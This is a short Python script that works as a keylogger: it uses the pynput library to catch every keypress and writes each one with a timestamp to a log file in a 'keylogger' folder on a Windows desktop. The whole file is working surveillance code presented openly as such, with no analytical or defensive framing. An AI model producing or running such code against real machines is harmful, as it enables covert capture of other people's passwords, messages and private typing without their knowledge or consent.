from pynput.keyboard import Listener , Key
import logging

path = "C:\\Users\\User\\Desktop\\keylogger"
logging.basicConfig(filename=(f"{path}\\logfile.txt"), \
                    level= logging.DEBUG , format= '%(asctime)s : %(message)s')

def keypress(Key):
    logging.info(str(Key))

with Listener(on_press = keypress) as listener:
    listener.join()